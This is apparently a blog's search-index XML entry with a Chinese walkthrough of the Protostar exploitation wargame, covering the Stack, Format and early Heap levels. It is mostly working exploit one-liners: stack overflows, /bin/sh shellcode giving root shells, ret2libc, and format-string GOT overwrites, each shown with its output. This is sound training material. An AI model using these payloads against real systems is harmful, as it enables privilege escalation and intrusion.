<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Exploit-Exercise_Protostar全攻略+解析]]></title>
    <url>%2F2018%2F07%2F22%2FExploit-Exercise-Protostar%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[目前进度： Stack 0 Stack 1 Stack 2 Stack 3 小结一：C/C++程序中的栈 Stack 4 小结二：EIP能好怎 Stack 5 小结三：shellcode Stack 6 Stack 7 Format 0 Format 1 Format 2 Format 3 Format 4 小结四：格式化字符串 Heap 0 Heap 1 Heap 2 Heap 3 Net 0 Net 1 Net 2 Final 0 Final 1 Final 2 Stack 012$ python -c "print 'a'*65" | ./stack0you have changed the 'modified' variable Stack 112$ python -c "print 'a'*64+'dcba'" | xargs ./stack1you have correctly got the variable to the right value Stack 21GREENIE=`python -c "print 'a'*64+'\x0a\x0d\x0a\x0d'"` ./stack2 Stack 312345678910(gdb) disas winDump of assembler code for function win:0x08048424 &lt;win+0&gt;: push %ebp0x08048425 &lt;win+1&gt;: mov %esp,%ebp0x08048427 &lt;win+3&gt;: sub $0x18,%esp0x0804842a &lt;win+6&gt;: movl $0x8048540,(%esp)0x08048431 &lt;win+13&gt;: call 0x8048360 &lt;puts@plt&gt;0x08048436 &lt;win+18&gt;: leave0x08048437 &lt;win+19&gt;: retEnd of assembler dump. 123$ python -c "print 'a'*64+'\x23\x84\x04\x08'" | ./stack3calling function pointer, jumping to 0x08048423code flow successfully changed Stack 412345678910111213141516171819202122(gdb) disas mainDump of assembler code for function main:0x08048408 &lt;main+0&gt;: push %ebp0x08048409 &lt;main+1&gt;: mov %esp,%ebp0x0804840b &lt;main+3&gt;: and $0xfffffff0,%esp0x0804840e &lt;main+6&gt;: sub $0x50,%esp0x08048411 &lt;main+9&gt;: lea 0x10(%esp),%eax0x08048415 &lt;main+13&gt;: mov %eax,(%esp)0x08048418 &lt;main+16&gt;: call 0x804830c &lt;gets@plt&gt;0x0804841d &lt;main+21&gt;: leave0x0804841e &lt;main+22&gt;: retEnd of assembler dump.(gdb) disas winDump of assembler code for function win:0x080483f4 &lt;win+0&gt;: push %ebp0x080483f5 &lt;win+1&gt;: mov %esp,%ebp0x080483f7 &lt;win+3&gt;: sub $0x18,%esp0x080483fa &lt;win+6&gt;: movl $0x80484e0,(%esp)0x08048401 &lt;win+13&gt;: call 0x804832c &lt;puts@plt&gt;0x08048406 &lt;win+18&gt;: leave0x08048407 &lt;win+19&gt;: retEnd of assembler dump. 1234567891011echo "s='a'*64\nfor i in range(0, 26):\n s += chr(ord('a')+i)\nprint s" | python### run with this pattern input(gdb) r &lt; ~/stack4.txtStarting program: /opt/protostar/bin/stack4 &lt; ~/stack4.txtProgram received signal SIGSEGV, Segmentation fault.0x706f6e6d in ?? ()#That's what we need###$ python -c "print 'a'*0x4c+'\xf4\x83\x04\x08'" | ./stack4code flow successfully changedSegmentation fault Stack 512345$ (python -c "print '\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80'+ (76-37)*'a'+'\xa0\xfc\xff\xbf'"; cat) | ./stack5iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)whoamiroot 12345$ (python -c "print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(76-29)*'\xcc'+'\xa0\xfc\xff\xbf'"; cat) | ./stack5iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)whoamiroot 12$ (python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80" + "\xcc"*(76-34) + "\xa0\xfc\xff\xbf"'; cat) | ./stack5Owned!!! Stack 6solution 1: Duplicated Shellcode1234$ python -c "print 'b'*80" |./stack6input path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbinput path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ▒Segmentation fault (core dumped) 这时在dump出来的文件里可以发现输入的东西在别处出现了 12345$ (python -c "print '\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80'+ (80-37)*'a'+'\x00\xe0\xfd\xb7'"; cat) | ./stack6input path please: got path 1▒▒▒RRRT[S_▒/bin▒G//sh@u▒;1ɰ ̀aaaaaaaaaaaaaaaaaaaaaaaaaaaiduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) 12345$ (python -c "print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(80-29)*'\xcc'+'\x00\xe0\xfd\xb7'"; cat) | ./stack6input path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒ 1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) solution 2: Return to .text12345$ (python -c "print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(80-29)*'\xcc'+'\xf9\x84\x04\x08'+'\x8c\xfc\xff\xbf'"; cat) | ./stack6input path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒ 1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) solution 3: Return to libc123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354(gdb) disas mainDump of assembler code for function main:0x080484fa &lt;main+0&gt;: push %ebp0x080484fb &lt;main+1&gt;: mov %esp,%ebp0x080484fd &lt;main+3&gt;: and $0xfffffff0,%esp0x08048500 &lt;main+6&gt;: call 0x8048484 &lt;getpath&gt;0x08048505 &lt;main+11&gt;: mov %ebp,%esp0x08048507 &lt;main+13&gt;: pop %ebp0x08048508 &lt;main+14&gt;: retEnd of assembler dump.(gdb) b *0x80484fdBreakpoint 1 at 0x80484fd: file stack6/stack6.c, line 26.(gdb) rStarting program: /opt/protostar/bin/stack6Breakpoint 1, 0x080484fd in main (argc=1, argv=0xbffffd54) at stack6/stack6.c:2626 stack6/stack6.c: No such file or directory. in stack6/stack6.c(gdb) p system$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ecffb0 &lt;__libc_system&gt;(gdb) p exit$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ec60c0 &lt;*__GI_exit&gt;(gdb) info proc mapprocess 16347cmdline = '/opt/protostar/bin/stack6'cwd = '/opt/protostar/bin'exe = '/opt/protostar/bin/stack6'Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/stack6 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/stack6 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fde000 0xb7fe2000 0x4000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [vdso] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [stack](gdb) find 0xb7e9700,+2000000,"/bin/sh"warning: Unable to access target memory at 0xb7e9700, halting search.Pattern not found.(gdb) find 0xb7e97000,+2000000,"/bin/sh"0xb7fba23fwarning: Unable to access target memory at 0xb7fd9647, halting search.1 pattern found.(gdb) x/s 0xb7fba23f0xb7fba23f: "KIND in __gen_tempname\"" 其中一行说到0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so，所以libc是装到了这个位置，但是我们找到/bin/sh后查看那个地方却不对 12$ strings -a -t x /lib/libc-2.11.2.so | grep /bin/sh 11f3bf /bin/sh 12(gdb) x/s 0xb7fb63bf0xb7fb63bf: "/bin/sh" 1234$ (python -c "print 'a'*80+'\xb0\xff\xec\xb7'+'\xc0\x60\xec\xb7'+'\xbf\x63\xfb\xb7'"; cat) | ./stack6input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa▒▒▒aaaaaaaaaaaa▒▒▒▒`췿c▒iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) solution 4: ROP（TODO）参考资料总览：https://resources.infosecinstitute.com/exploiting-protostar-stack-4-7/#gref 总览：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_6.html ret2.text：http://www.bitforestinfo.com/2018/04/binary-exploitation-protostar-stack6_20.html ret2libc：https://ohexfortyone.com/2018/03/exploit-exercises-protostar-stack-6.html ret2libc：https://medium.com/@airman604/protostar-stack7-walkthrough-2aa2428be3e0 ROP：blackhat-Return-Oriented Programming: Exploits Without Code Injection ROP：ROP轻松谈 Stack 7123456789101112131415161718192021222324msf &gt; msfelfscan stack7[*] exec: msfelfscan stack7Usage: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfelfscan [mode] &lt;options&gt; [targets]Modes: -j, --jump [regA,regB,regC] Search for jump equivalent instructions -p, --poppopret Search for pop+pop+ret combinations -r, --regex [regex] Search for regex match -a, --analyze-address [address] Display the code at the specified address -b, --analyze-offset [offset] Display the code at the specified offsetOptions: -A, --after [bytes] Number of bytes to show after match (-a/-b) -B, --before [bytes] Number of bytes to show before match (-a/-b) -D, --disasm Disassemble the bytes at this address -I, --image-base [address] Specify an alternate ImageBase -h, --help Show this messagemsf &gt; msfelfscan --jump eax stack7[*] exec: msfelfscan --jump eax stack7[stack7]0x080484bf call eax0x080485eb call eax 12345$ (python -c "print '\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80'+(80-29)*'\xcc'+'\xbf\x84\x04\x08'"; cat) | ./stack7input path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒ 1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒̿▒▒▒▒▒▒▒▒▒▒▒̿▒iduid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user) Format 0solution 0: stackoverflow12$ python -c "print 'a'*64+'\xef\xbe\xad\xde'" | xargs ./format0you have hit the target correctly :) solution 1: format string12$ python -c "print '%64d\xef\xbe\xad\xde'" | xargs ./format0you have hit the target correctly :) Format 11234$ objdump -t format1 | grep target08049638 g O .bss 00000004 target$ ./format1 `python -c "print '\x38\x96\x04\x08A' +'%08x.'*127+'%08n.'+'%08x.'*22"`8A0804960c.bffff9e8.08048469.b7fd8304.b7fd7ff4.bffff9e8.08048435.bffffbb0.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa68.b7eadc76.00000002.bffffa94.bffffaa0.b7fe1848.bffffa50.ffffffff.b7ffeff4.0804824d.00000001.bffffa50.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa68.e6b62d35.ccfdbb25.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa94.08048450.08048440.b7ff1040.bffffa8c.b7fff8f8.00000002.bffffba6.bffffbb0.00000000.bffffea4.bffffec6.bffffed0.bffffee4.bffffef6.bfffff06.bfffff19.bfffff26.bfffff31.bfffff6f.bfffff86.bfffff97.bfffffa5.bfffffbc.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.0f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffb8b.0000001f.bffffff2.0000000f.bffffb9b.00000000.00000000.00000000.00000000.00000000.4f000000.e6ba1f47.9c250ca2.20d18978.691cdb81.00363836.00000000.2f2e0000.6d726f66.00317461..38302541.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.you have modified the target :) 1234$ i=0; while [ $i -le 200 ]; do ./format1 `python -c "print 'aaaa%%%03d\\\$08x.' % $i"` ; i=$((i+1)); doneaaaa%0$08x.aaaa0804960c.aaaabffffcc8.aaaa08048469.aaaab7fd8304.aaaab7fd7ff4.aaaabffffcc8.aaaa08048435.aaaabffffe98.aaaab7ff1040.aaaa0804845b.aaaab7fd7ff4.aaaa08048450.aaaa00000000.aaaabffffd48.aaaab7eadc76.aaaa00000002.aaaabffffd74.aaaabffffd80.aaaab7fe1848.aaaabffffd30.aaaaffffffff.aaaab7ffeff4.aaaa0804824d.aaaa00000001.aaaabffffd30.aaaab7ff0626.aaaab7fffab0.aaaab7fe1b28.aaaab7fd7ff4.aaaa00000000.aaaa00000000.aaaabffffd48.aaaa4e55cc8b.aaaa9d54d149.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000002.aaaa08048340.aaaa00000000.aaaab7ff6210.aaaab7eadb9b.aaaab7ffeff4.aaaa00000002.aaaa08048340.aaaa00000000.aaaa08048361.aaaa0804841c.aaaa00000002.aaaabffffd74.aaaa08048450.aaaa08048440.aaaab7ff1040.aaaabffffd6c.aaaab7fff8f8.aaaa00000002.aaaabffffe8e.aaaabffffe98.aaaa00000000.aaaabffffea6.aaaabffffec7.aaaabffffed1.aaaabffffee5.aaaabffffef7.aaaabfffff07.aaaabfffff1a.aaaabfffff27.aaaabfffff32.aaaabfffff70.aaaabfffff87.aaaabfffff98.aaaabfffffa6.aaaabfffffbd.aaaa00000000.aaaa00000020.aaaab7fe2414.aaaa00000021.aaaab7fe2000.aaaa00000010.aaaa0f8bfbff.aaaa00000006.aaaa00001000.aaaa00000011.aaaa00000064.aaaa00000003.aaaa08048034.aaaa00000004.aaaa00000020.aaaa00000005.aaaa00000007.aaaa00000007.aaaab7fe3000.aaaa00000008.aaaa00000000.aaaa00000009.aaaa08048340.aaaa0000000b.aaaa000003e9.aaaa0000000c.aaaa00000000.aaaa0000000d.aaaa000003e9.aaaa0000000e.aaaa000003e9.aaaa00000017.aaaa00000001.aaaa00000019.aaaabffffe6b.aaaa0000001f.aaaabffffff2.aaaa0000000f.aaaabffffe7b.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa8c000000.aaaa4f4034dd.aaaaa130a824.aaaa613016f9.aaaa696337b9.aaaa00363836.aaaa00000000.aaaa00000000.aaaa00000000.aaaa2f2e0000.aaaa6d726f66.aaaa00317461.aaaa61616161.aaaa31333125.aaaa78383024.aaaa5353002e.aaaa4c435f48.aaaa544e4549.aaaa3239313d.aaaa3836312e.aaaa3631312e.aaaa3220312e.aaaa20383335.aaaa55003232.aaaa3d524553.aaaa72657375.aaaa49414d00.aaaa762f3d4c.aaaa6d2f7261.aaaa2f6c6961.aaaa72657375.aaaa444c4f00.aaaa3d445750.aaaa6d6f682f.aaaa73752f65.aaaa48007265.aaaa3d454d4f.aaaa6d6f682f.aaaa73752f65.aaaa53007265.aaaa545f4853.aaaa2f3d5954.aaaa2f766564.aaaa2f737470.aaaa4f4c0030.aaaa4d414e47.aaaa73753d45.aaaa54007265.aaaa3d4d5245.aaaa72657478.aaaa4150006d.aaaa2f3d4854.aaaa2f727375.aaaa61636f6c.aaaa69622f6c.aaaa752f3a6e.aaaa622f7273.aaaa2f3a6e69.aaaa3a6e6962.aaaa7273752f.aaaa636f6c2f.aaaa672f6c61.aaaa73656d61.aaaa73752f3a.aaaa61672f72.aaaa0073656d.aaaa50534944.aaaa3d59414c.aaaa61636f6c.aaaa736f686c.aaaa30313a74.aaaa4c00302e.aaaa3d474e41.aaaa555f6e65.aaaa54552e53.aaaa00382d46.aaaa4c454853.aaaa622f3d4c.aaaa732f6e69.aaaa57500068.aaaa6f2f3d44.aaaa702f7470.aaaa6f746f72.$ ./format1 `python -c "print '\x38\x96\x04\x08%130\\\$08n.'"`8.you have modified the target :) Format 212345678910111213141516171819202122232425262728293031$ objdump -t format2 | grep target080496e4 g O .bss 00000004 target$ i=0; while [ $i -le 10 ]; do python -c "print 'aaaa%%%03d\$08x.' % $i" | ./format2 ; i=$((i+1)); doneaaaa%0$08x.target is 0 :(aaaa00000200.target is 0 :(aaaab7fd8420.target is 0 :(aaaabffffb14.target is 0 :(aaaa61616161.target is 0 :(aaaa35303025.target is 0 :(aaaa78383024.target is 0 :(aaaa00000a2e.target is 0 :(aaaab7fff524.target is 0 :(aaaabffffb70.target is 0 :(aaaab7fe35c9.target is 0 :($ python -c "print '\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08x.'" | ./format2aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496e4.target is 0 :($ python -c "print '\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08n.'" | ./format2aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.you have modified the target :) Format 3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475$ objdump -t format3 | grep target080496f4 g O .bss 00000004 target$ i=0; while [ $i -le 20 ]; do python -c "print 'aaaa%%%03d\$08x.' % $i" | ./format3 ; i=$((i+1)); doneaaaa%0$08x.target is 00000000 :(aaaa00000000.target is 00000000 :(aaaabffffad0.target is 00000000 :(aaaab7fd7ff4.target is 00000000 :(aaaa00000000.target is 00000000 :(aaaa00000000.target is 00000000 :(aaaabffffcd8.target is 00000000 :(aaaa0804849d.target is 00000000 :(aaaabffffad0.target is 00000000 :(aaaa00000200.target is 00000000 :(aaaab7fd8420.target is 00000000 :(aaaabffffb14.target is 00000000 :(aaaa61616161.target is 00000000 :(aaaa33313025.target is 00000000 :(aaaa78383024.target is 00000000 :(aaaa00000a2e.target is 00000000 :(aaaab7fff524.target is 00000000 :(aaaabffffb70.target is 00000000 :(aaaab7fe35c9.target is 00000000 :(aaaa00000007.target is 00000000 :(aaaa00000010.target is 00000000 :($ python -c "print '\xf4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.target is 00000000 :($ python -c "print 'a%13\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3Segmentation fault$ python -c "print 'a%13\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3a78383024aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa33312561.target is 00000000 :($ python -c "print 'a%14\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3a080496f3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.target is 00000000 :($ python -c "print 'a%14\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.target is 00000000 :($ python -c "print 'a%14\$08n\xf5\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.target is 00000100 :($ python -c "print 'a%16\$08na%17\$08n\xf7\x96\x04\x08\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.target is 01000000 :($ python -c "print 'a%16\$08na%17\$08n\xf7\x96\x04\x06\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3Segmentation fault$ python -c "print 'a%16\$08na%17\$08n\xf7\x96\x04\x08\xf6\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.target is 00020000 :($ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08'+'a'*(0x44-12)+'%12\$08x.'+'a'*(0x55-0x44)+'%13\$08x.'+'a'*(0x102-0x55)+'%14\$08x.'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.aaaaaaaaaaaaaaaaa080496f5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6.target is 00000000 :($ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08'+'a'*(0x44-12)+'%12\$08x'+'a'*(0x55-0x44)+'%13\$08x'+'a'*(0x102-0x55)+'%14\$08x'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4aaaaaaaaaaaaaaaaa080496f5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6 solution 0: Brute!12345$ python -c "print '\xf4\x96\x04\x08'+'%016930112d'+'%12\$08n'" | ./format3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000...# 反正这里有很多很多很多零，我就好心删了它们...0000000000000you have modified the target :) solution 1: Gentle123$ python -c "print '\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08'+'a'*(0x44-12)+'%12\$08n'+'a'*(0x55-0x44)+'%13\$08n'+'a'*(0x102-0x55)+'%14\$08n'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaayou have modified the target :) solution 2: More gentle123$ python -c "print 'a'+'%16\$hhn'+'a'+'%17\$hhn'+'\xf7\x96\x04\x08'+'\xf6\x96\x04\x08'+'\xf5\x96\x04\x08'+'\xf4\x96\x04\x08'+'a'*(0x44-2-16)+'%19\$hhn'+'a'*(0x55-0x44)+'%18\$hhn'" | ./format3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaayou have modified the target :) Format 412345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970$ gdb -q format4Reading symbols from /opt/protostar/bin/format4...done.(gdb) disas helloDump of assembler code for function hello:0x080484b4 &lt;hello+0&gt;: push %ebp0x080484b5 &lt;hello+1&gt;: mov %esp,%ebp0x080484b7 &lt;hello+3&gt;: sub $0x18,%esp0x080484ba &lt;hello+6&gt;: movl $0x80485f0,(%esp)0x080484c1 &lt;hello+13&gt;: call 0x80483dc &lt;puts@plt&gt;0x080484c6 &lt;hello+18&gt;: movl $0x1,(%esp)0x080484cd &lt;hello+25&gt;: call 0x80483bc &lt;_exit@plt&gt;End of assembler dump.(gdb) quit$ objdump -TR format4format4: file format elf32-i386DYNAMIC SYMBOL TABLE:00000000 w D *UND* 00000000 __gmon_start__00000000 DF *UND* 00000000 GLIBC_2.0 fgets00000000 DF *UND* 00000000 GLIBC_2.0 __libc_start_main00000000 DF *UND* 00000000 GLIBC_2.0 _exit00000000 DF *UND* 00000000 GLIBC_2.0 printf00000000 DF *UND* 00000000 GLIBC_2.0 puts00000000 DF *UND* 00000000 GLIBC_2.0 exit080485ec g DO .rodata 00000004 Base _IO_stdin_used08049730 g DO .bss 00000004 GLIBC_2.0 stdinDYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE080496fc R_386_GLOB_DAT __gmon_start__08049730 R_386_COPY stdin0804970c R_386_JUMP_SLOT __gmon_start__08049710 R_386_JUMP_SLOT fgets08049714 R_386_JUMP_SLOT __libc_start_main08049718 R_386_JUMP_SLOT _exit0804971c R_386_JUMP_SLOT printf08049720 R_386_JUMP_SLOT puts08049724 R_386_JUMP_SLOT exit$ objdump -t format4 | grep hello080484b4 g F .text 0000001e hello$ i=0; while [ $i -le 10 ]; do i=$((i+1)); python -c "print 'aaaa%%%03d\$08x' % $i" | ./format4; doneaaaa00000200aaaab7fd8420aaaabffffb14aaaa61616161aaaa35303025aaaa78383024aaaa0000000aaaaab7fff524aaaabffffb70aaaab7fe35c9aaaa00000007(gdb) b *0x0804851aBreakpoint 1 at 0x804851a: file format4/format4.c, line 27.(gdb) rStarting program: /opt/protostar/bin/format4Breakpoint 1, main (argc=1, argv=0xbffffd54) at format4/format4.c:2727 format4/format4.c: No such file or directory. in format4/format4.c(gdb) p exit$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7ec60c0 &lt;*__GI_exit&gt;(gdb) quit$ python -c "print '\x24\x97\x04\x08'+'\x25\x97\x04\x08'+'\x26\x97\x04\x08'+'\x27\x97\x04\x08'+'%164x%4\$n'+'%208x%5\$n'+'%128x%6\$n'+'%260x%7\$n'" | ./format4$%&amp;' 200 b7fd8420 bffffb14 8049724code execution redirected! you win Heap 0123456$ objdump -t heap0 | grep winner08048464 g F .text 00000014 winner08048478 g F .text 00000014 nowinner$ ./heap0 `python -c "print 